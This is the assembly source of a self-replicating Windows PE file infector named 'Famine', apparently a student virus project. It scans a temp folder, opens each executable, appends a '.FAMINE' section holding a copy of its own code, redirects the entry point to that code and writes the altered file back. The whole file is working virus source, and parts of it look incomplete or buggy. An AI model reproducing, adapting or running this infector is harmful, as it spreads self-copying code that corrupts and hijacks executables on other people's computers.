;-----------------------------------
;Descr  : My First 64-bit MASM program
;ml64 prog.asm /c
;golink /console /entry main prog.obj msvcrt.dll, or
;gcc -m64 prog.obj -o prog.exe (main/ret). This needs 64-bit GCC.
;-----------------------------------

includelib libcmt.lib
includelib kernel32.lib

extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn ReadFile:proc
extrn CreateFileA:proc
extrn GetFileSize:proc
extrn SetFilePointer:proc
extrn WriteFile:proc
extrn GetProcessHeap:proc
extrn HeapAlloc:proc

.code

; rbp
; 40-48 : alignment
; 32-40 : av[0]
; 00-32 : shadow space
; rsp

label_debut:

debut_main:
main proc

		push rbp
		mov rbp, rsp

		push RAX
		push RBX
		push RCX
		push RDX
		push RSI
		push RDI
		push R8 
		push R9 
		push R10
		push R11
		push R12
		push R13
		push R14
		push R15

		sub	rsp, 48
		or rsp, 0fh
		inc rsp
		sub rsp, 010h

		mov rcx, [rdx]
		mov [rsp + 32], rcx

		test BYTE ptr [MUST_EXIT], 1
		jne	not_nt_create_file
		call proc_nt_create_file ; Si must exit = 1

		not_nt_create_file:
	 	call CreateFileA

		lea rcx, TMP_1
		call infect_folder
		mov rdx, label_fin
		mov rcx, label_debut
		sub rdx, rcx

		add rsp, 48 

		pop R15
		pop R14
		pop R13
		pop R12
		pop R11
		pop R10
		pop R9 
		pop R8 
		pop RDI
		pop RSI
		pop RDX
		pop RCX
		pop RBX
		pop RAX
		
		cmp BYTE ptr [MUST_EXIT], 1
		je stop

		pop rbp
		call get_rip
		sub rax, 90h
		sub rax, qword ptr [ENTRY_POINT]
		jmp rax

stop:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
main endp
fin_main:


MUST_EXIT db 1
ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
SECTION_NAME db '.FAMINE',0

; rbp
; 72 - 80   : padding
; 64 - 72   : saved rdi
; 60 - 64	: size_of_main 
; 56 - 60	: Addresse virtuelle de notre code
; 48 - 56	: nbr of bytes read 
; 40 - 48	: rsp - 64 // HeapAlloc ?
; 32 - 40	: params
; 00 - 32	: shadow
; rsp

; r10d : VA de Famine dans le fichier distant
; r12 : handle
; r13 : fileSize
; r14 : taille de notre code
; r15 : Optianl Header address

handle_file proc ; int handle
	push rbp
	mov rbp, rsp
	sub rsp, 80

	mov qword ptr [rsp + 64], rdi


	mov r12, rcx
	mov rcx, r12
	mov rdx, 0 
	call GetFileSize

	mov r13, rax ; r13 = taille du fichier

	mov rcx, label_fin
	mov rdx, label_debut
	sub rcx, rdx

	mov r14, rcx
	
	add rcx, rax
	mov rdi, rcx ; rdi = taille a creer

	call GetProcessHeap

	mov rcx, rax
	mov rdx, 0
	mov r8, rdi
	call HeapAlloc

	mov [rsp + 40], rax
	mov word ptr [rax], 5a4dh

	add rax, 2
	sub r13, 2

	mov rcx, r12
	mov rdx, rax
	mov r8, r13
	lea r9, [rsp + 48]
	mov qword ptr [rsp + 32], 0
	call ReadFile

	test rax, rax
	je ret_failure

	test r13, qword ptr [rsp+48]
	je ret_failure

	mov rcx, qword ptr [rsp + 40]
	mov rdx, r13
	call init_imports ; On fait les imports

	mov rax, qword ptr [rsp + 40]
	add rax, 3Ch
	xor rdx, rdx
	mov edx, dword ptr [rax] ; on saute le MS DOS header 
	mov rax, qword ptr [rsp + 40]
	add rax, rdx

	add rax, 6
	mov cx, word ptr [rax] ; cx = OldNumberOfSections
	inc word ptr [rax] ; NumberOfSections++
	add rax, 14

	xor rbx, rbx
	mov bx, word ptr [rax]
		mov r15, rax
		add r15, 4
	add rax, rbx
	add rax, 4 ;  ptr += SizeOfOptionaHeaders + 4

	xor rbx, rbx
	mov bx, cx
	mov rdx, rbx

		mov rbx, rax ; temp

	mov rax, 40
	imul rdx
	add rax, rbx ; rax += olDSizeOfOptionalHeaders

	mov rbx, qword ptr [SECTION_NAME]
	mov  [rax], rbx ; on met le nom de la section

	add rax, 8
	mov dword ptr [rax], r14d ; on met la taille de Famine

	add rax, 4
	mov rbx, rax
	sub rbx, 40
	mov r8d, dword ptr [rbx]
	mov r9d, dword ptr [rbx - 4]
	add r8d, r9d
	or r8d, 0fffh
	inc r8d
	mov dword ptr [rsp + 56], r8d
	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
	xor r10, r10
	mov r10d, r8d

	add rax, 4
	mov rbx, r14
	or rbx, 0ffh
	inc rbx
	mov dword ptr [rax], ebx ; size of raw data

	add rax, 4
	add r13, 2
	mov dword ptr [rax], r13d ; Emplacement du code = taille du fichier

	add rax, 4
	mov qword ptr [rax], 0  ; PointerToReliocations and PointerToLineNumber

	add rax, 8
	mov dword ptr [rax], 0 ; NUmberOfRelocations and NumberOfLineNumber

	add rax, 4
	mov dword ptr [rax], 60000020h ; Characterisitcs

	mov rcx, [rsp + 40]
	add rcx, r13
	lea rdx, label_debut
	mov r8, r14
	call ft_memcpy	 ; on ecrit notre code a la fin du buffer

	mov rcx, fin_main
	mov rdx, debut_main
	sub rcx, rdx
	mov dword ptr [rsp + 60], ecx ; On sauvegarde la taille du main

	mov rcx, [rsp + 40]
		add rcx, r13
		xor rbx, rbx
		mov ebx, dword ptr [rsp + 60]
	add rcx, rbx
	mov byte ptr [rcx], 0 ; on met MUST EXIT a 0

	add r15, 4
		mov rbx, r14
		or rbx, 0ffh
		inc rbx
	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe

	add r15, 12
	xor rbx, rbx
	mov ebx, dword ptr [r15]
	inc rcx
	sub r10, rbx
	mov rbx, r10
	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point

	mov rax, debut_main
	mov rbx, label_debut
	sub rax, rbx ; rax = label_debut - label_main = 0? 

	add rax, r13
	mov eax, dword ptr [rsp + 56]
	mov dword ptr [r15], eax ; on modifie l'entry point par notre main

	add r15, 40
	mov eax, dword ptr [rsp + 56]
	add eax, 01000h
	mov dword ptr [r15], eax ; Size of image


	mov rcx, r12
	mov rdx, 0
	mov r8, 0
	mov r9, 0
	call SetFilePointer

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, r13
	add r8, r14
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0
	call WriteFile

	mov rcx, [rsp + 40]
	mov rdx, 0
	mov r8, r14
	and	r8, 0ffh
	xor r8, 0ffh
	inc r8
		mov rbx, r8
	call ft_memset

	mov rcx, r12
	mov rdx, [rsp + 40]
	mov r8, rbx
	lea r9, [rsp + 56]
	mov qword ptr [rsp + 32], 0
	call WriteFile

ret_failure:
	mov rdi, qword ptr [rsp + 64]
	mov rsp, rbp
	pop rbp
	ret
handle_file endp

; rbp
; 70 - 80		: padding
; 66 - 70		: number_of_bytes_read
; 64 - 66		:  Buffer
; 32 - 64		: params
; 00 - 32		: shadow
; rsp

open_file proc ; char *file_path - return fd or 0
	push rbp
	mov rbp, rsp
	sub rsp, 80
	
	xor rax, rax

	mov rdx, 0C0000000h ; Desired Access
	mov r8, 0 ; Share permission
	mov r9, 0 ; NULL
	mov rax, 3
	mov [rsp + 32], rax ; Open only if exists
	mov rax, 80h
	mov [rsp + 36], rax ; flag normal
	mov rax, 0
	mov [rsp + 40], rax ; no attribute template
	call CreateFileA
	
	mov r12, rax

	cmp rax, -1
	je ret_error


	mov rcx, r12
	lea rdx, [rsp + 64]
	mov r8, 2
	lea r9, [rsp + 66]
	mov rax, 0
	mov [rsp + 32], rax ; Open only if exists
	call ReadFile

	mov ax, word ptr [rsp + 64]
	cmp ax, 5a4dh
	je  ret_ok

ret_error:
	mov r12, -1
ret_ok:
	mov rax, r12
	mov rsp, rbp
	pop rbp
	ret
open_file endp

; rbp	
; 400-528	: path + file name
; 40-400	: structure WIN32_FIND_DATA dirent
; 32-40		: folder_name
; 00-32		: shadow
; rsp

infect_folder proc ; parametres : char *folder_name
		push rbp
		mov rbp, rsp
		sub	rsp, 528

		mov [rsp + 32], rcx

		mov rcx, [rsp + 32]
		lea rdx, [rsp + 40]
		call FindFirstFileA

		mov rsi, rax
loop_start:
		mov rcx, rsi
		lea rdx, [rsp + 40]
		call FindNextFileA

		cmp rax, 0
		je loop_end

		lea rcx, [rsp + 400]
		lea rdx, TMP_1_NAME
		mov r8, 128
		call ft_strncpy

		lea rcx, [rsp + 400]
		lea rdx, [rsp + 84]
		mov r8, 128
		call ft_strncat

		lea rcx, [rsp + 400]
		call open_file

		cmp rax, -1
		je loop_start

		mov rcx, rax 
		call handle_file

		jmp loop_start
loop_end:
		xor rax, rax
		mov rsp, rbp
		pop rbp
		ret
infect_folder endp

ft_memset proc ; ft_memset(char *dst, char c, int n)
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx
	debut_boucle_ft_memset:
	cmp rax, r8
	je	fin_boucle_ft_memset
	mov byte ptr [rcx], dl
	inc rcx
	inc rax
	jmp debut_boucle_ft_memset
	fin_boucle_ft_memset:

	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_memset endp

ft_strncat proc ; char *strncat(char *dest, const char *src, size_t n);
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx
	debut_boucle_ft_strncat:
	cmp rax, r8
	je	fin_boucle_ft_memset
	cmp byte ptr [rcx], 0
	je fin_boucle_ft_memset

	inc rcx
	inc rax
	jmp debut_boucle_ft_strncat
	fin_boucle_ft_memset:
	debut_sec_boucle:
	cmp rax, r8
	je	fin_sec_boucle
	cmp byte ptr [rdx], 0
	je fin_sec_boucle
	mov r10B, [rdx]
	mov byte ptr [rcx], r10B
	inc rcx
	inc rdx
	inc rax
	jmp debut_sec_boucle
	fin_sec_boucle:
	mov byte ptr [rcx], 0
	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_strncat endp

ft_strncpy proc ; char *strncpy(char *dest, const char *src, size_t n);
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx

	debut_boucle_ft_strncpy:
	cmp rax, r8
	je	fin_boucle_strncpy
	cmp byte ptr [rdx], 0
	je fin_boucle_strncpy
	mov r10B, [rdx]
	mov byte ptr [rcx], r10B
	inc rcx
	inc rdx
	inc rax
	jmp debut_boucle_ft_strncpy
	fin_boucle_strncpy:
	mov byte ptr [rcx], 0
	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_strncpy endp

ft_memcpy proc ; char *strncpy(char *dest, const char *src, size_t n);
	push rbp
	mov rbp, rsp

	xor rax, rax
	mov r9, rcx

	debut_boucle_ft_memcpy:
	cmp rax, r8
	je	fin_boucle_memcpy
	mov r11b, [rdx]
	mov byte ptr [rcx], r11b
	inc rcx
	inc rdx
	inc rax
	jmp debut_boucle_ft_memcpy
	fin_boucle_memcpy:
	mov rax, r9
	mov rsp, rbp
	pop rbp
	ret
ft_memcpy endp

get_rip proc
	push rbp
	mov rbp, rsp

	mov rax, [rsp + 8]

	mov rsp, rbp
	pop rbp
	ret
get_rip endp

proc_nt_create_file proc
	jmp [qword ptr infect_folder]
proc_nt_create_file endp

ft_strequ proc ; int8_t strequ(const char *str1, const char *str2) ; return 1 if str1 == str2, return 0 else
	push rbp
	push r8
	mov rbp, rsp

	mov rax, 0
debut_boucle_ft_strequ:
	cmp byte ptr [rcx], 0
	je stop_ft_strequ
	cmp byte ptr [rdx], 0
	je stop_ft_strequ
	mov r8b, byte ptr [rcx] 
	cmp r8b, byte ptr [rdx]
	jne stop_ft_strequ_not_equal
	inc rcx
	inc rdx
	jmp debut_boucle_ft_strequ
stop_ft_strequ:
	mov r8b, byte ptr [rcx] 
	cmp r8b, byte ptr [rdx]
	jne stop_ft_strequ_not_equal
	mov rax, 1
stop_ft_strequ_not_equal:
	mov rsp, rbp
	pop r8
	pop rbp
	ret
ft_strequ endp

; rbp
; 64 - 72   : Virtual Address de idata
; 56 - 64	: PointerToRawData de idata
; 48 - 56	: tmp storage for rax
; 40 - 48   : taille du fichier
; 32 - 40	: void *fichier
; 00 - 32	: shadow
; rsp

KERNEL_32_DLL_NAME db 'KERNEL32.dll',0h

init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
	push rbp
	mov rbp, rsp
	sub rsp, 72

	mov qword ptr [rsp + 32], rcx
	mov qword ptr [rsp + 40], rdx ; on sauvegarde les parametres
	

	mov rax, rcx
	add rax, 3ch
	xor rdx, rdx
	mov edx, dword ptr [rax] ; o saute le header DOS
	mov rax, rcx
	add rax, rdx

	add rax, 4
	
	mov [rsp + 48], rax

	mov rcx, rax
	mov rdx, qword ptr [rsp + 40]
	call get_idata_values

	mov [rsp + 56], rdx
	mov [rsp + 64], rcx
	
	mov rax, qword ptr [rsp + 48]

	add rax, 8ch ; Champ import directory rva
	xor rbx, rbx
	mov ebx, dword ptr [rax] ; on met la rva d'import directory dans rbx
	sub rbx, rcx
	add rbx, rdx ; on transforme ca en file offset
	add rbx, qword ptr [rsp + 32] ; on ajoute l'addresse ou est charge le fichier
	mov rax, rbx ; on met ca dans rax

debut_boucle_init_imports_find_kernel32:
	add rax, 0ch ; on va sur le champ Name
	mov [rsp + 48], rax

	xor rbx, rbx
	mov ebx, dword ptr [rax]
	sub rbx, qword ptr [rsp + 64]
	add rbx, qword ptr [rsp + 56]
	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
	lea rcx, KERNEL_32_DLL_NAME
	mov rdx, rbx
	call ft_strequ
	cmp rax, 1
	je fin_boucle_init_imports_find_kernel32
	mov rax, qword ptr [rsp + 48]
	add rax, 8
	jmp debut_boucle_init_imports_find_kernel32


fin_boucle_init_imports_find_kernel32:
	
	mov rsp, rbp
	pop rbp
	ret

init_imports endp

get_idata_values proc ; get_idata_values(void *file_header, int taille_du_fichier). Retourne VirtualAddress dans rcx, et PointerToRawData dans rdx
	push rbp
	push rbx
	mov rbp, rsp
	sub rsp, 32

	; sections = file header + sizeof(file_header) + SizeOfOptionalHeader
	mov rax, rcx
	add rax, 10h
	xor rbx, rbx
	mov bx, word ptr [rax]
	add rax, rbx
	add rax, 4
debut_boucle_get_idata:
	xor rbx, rbx
	mov ebx, 00006174h
	rol rbx, 32
	mov rdx, rbx
	mov ebx, 6164692eh
	or	rbx, rdx
	cmp qword ptr [rax], rbx
	je	fin_boucle_get_idata
	add rax, 28h
	jmp	debut_boucle_get_idata
fin_boucle_get_idata:
	mov ecx, dword ptr [rax + 0ch]
	mov edx, dword ptr [rax + 014h]
	mov rsp, rbp
	pop rbx
	pop rbp
	ret
get_idata_values  endp

label_fin:
end